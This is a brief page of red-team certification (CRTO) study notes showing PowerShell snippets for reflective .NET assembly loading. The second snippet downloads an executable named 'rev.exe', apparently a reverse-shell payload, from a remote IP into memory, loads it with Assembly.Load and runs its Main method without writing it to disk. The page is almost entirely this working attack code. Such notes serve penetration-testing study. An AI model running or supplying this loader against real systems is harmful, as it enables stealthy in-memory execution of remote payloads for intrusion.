---
title: CRTO Notes
date: 2021-08-04 21:00:00 0000
categories: [RED_TEAM, CRTO]
tags: [C# CRTO REDTEAMING]
---

```csharp
[system.reflection.assembly]::LoadFile("file")
 [namespace.class]::Main()
```

Binary reflective loading

```csharp
$data = (New-Object System.Net.WebClient).DownloadData('http://10.10.10.10/rev.exe')
$assem = [System.Reflection.Assembly]::Load($data)
[rev.Program]::Main("".Split())
```
